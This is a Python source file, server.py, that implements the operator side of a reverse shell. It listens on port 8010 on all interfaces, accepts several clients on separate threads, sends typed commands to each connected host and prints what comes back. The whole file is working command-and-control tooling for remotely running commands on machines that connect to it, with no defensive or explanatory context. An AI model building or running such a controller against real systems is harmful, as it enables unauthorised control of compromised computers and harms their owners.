# server.py
import socket
import threading

def handle_client(conn, addr):
    print(f"[+] Connected from {addr}")
    while True:
        try:
            cmd = input(f"Shell[{addr}]: ")  # Take command from operator
            if not cmd.strip():
                continue
            conn.send(cmd.encode())

            if cmd.lower() in ["exit", "quit"]:
                conn.close()
                break

            output = conn.recv(4096).decode(errors="ignore")
            print(output)
        except Exception as e:
            print(f"[-] Connection error: {e}")
            conn.close()
            break

def main():
    host = "0.0.0.0"  # Listen on all interfaces
    port = 8010

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}...")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

if __name__ == "__main__":
    main()
